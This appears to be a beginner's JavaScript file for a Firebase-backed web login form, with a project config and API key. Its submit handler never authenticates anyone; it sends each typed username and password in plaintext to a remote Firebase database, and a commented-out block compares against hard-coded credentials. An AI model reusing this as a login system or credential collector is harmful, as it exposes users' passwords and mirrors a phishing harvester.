const firebaseConfig = {
    apiKey: "AIzaSyDwzXfsxgvDbCVBre-vnHbAU8QQGIrkIGA",
    authDomain: "my-firstproject-822b4.firebaseapp.com",
    databaseURL: "https://my-firstproject-822b4-default-rtdb.firebaseio.com",
    projectId: "my-firstproject-822b4",
    storageBucket: "my-firstproject-822b4.appspot.com",
    messagingSenderId: "1072894564614",
    appId: "1:1072894564614:web:5da9c4de5140ab2ada2687"
  };
// initialize firebase
firebase.initializeApp(firebaseConfig);
// reference your database
var loginFormDB = firebase.database().ref("loginForm");
document.getElementById("login-form").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

  var username = getElementVal("username");
  var password = getElementVal("password");
  //var msgContent = getElementVal("msgContent");

  saveMessages(username,password);

  //   enable alert
  document.querySelector(".alert").style.display = "block";

  //   remove the alert
  setTimeout(() => {
    document.querySelector(".alert").style.display = "none";
  }, 3000);

  //   reset the form
  document.getElementById("login-form").reset();
}

const saveMessages = (username, password) => {
  var newLoginForm = loginFormDB.push();

  newLoginForm.set({
    username: username,
    password: password,
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};















// const loginForm = document.getElementById("login-form");
// const loginButton = document.getElementById("login-form-submit");
// const loginErrorMsg = document.getElementById("login-error-msg");

// loginButton.addEventListener("click", (e) => {
//     e.preventDefault();
//     const username = loginForm.username.value;
//     const password = loginForm.password.value;

//     if (username === "user" && password === "web_dev") {
//         alert("You have successfully logged in.");
//         location.reload();
//     } else {
//         loginErrorMsg.style.opacity = 1;
//     }
// })

